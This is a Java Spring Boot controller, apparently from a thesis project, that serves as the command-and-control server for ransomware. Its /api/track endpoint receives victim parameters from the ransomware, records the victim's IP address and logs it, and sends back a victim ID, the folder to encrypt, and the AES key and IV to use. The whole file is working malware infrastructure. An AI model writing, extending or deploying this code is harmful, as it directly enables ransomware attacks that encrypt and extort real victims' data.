package it.ssri.tesi.c2.api;

import it.ssri.tesi.c2.dto.VictimDto;
import it.ssri.tesi.c2.service.C2Service;
import jakarta.servlet.http.HttpServletRequest;
import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

import java.text.MessageFormat;
import java.util.Map;

@Slf4j
@RequiredArgsConstructor
@RestController
@RequestMapping("/api")
public class C2Api {

    private final C2Service service;
    private static final String RESPONSE = "{0};{1};{2};{3}";

    @GetMapping(value = "/track", produces = "text/plain")
    public ResponseEntity<String> track(@RequestParam Map<String, String> queryParams, HttpServletRequest request) {
        if(request.getRemoteAddr() != null) {
            queryParams.put("ip_address", request.getRemoteAddr());
        }

        log.info("Received victim params from ransomware: {}", queryParams);

        VictimDto victimDto = service.manageAttack(queryParams);
        return ResponseEntity.ok(MessageFormat.format(RESPONSE, victimDto.getId(),
                victimDto.getEncryptedFolder(), victimDto.getAesKey(), victimDto.getAesIv()));
    }

}
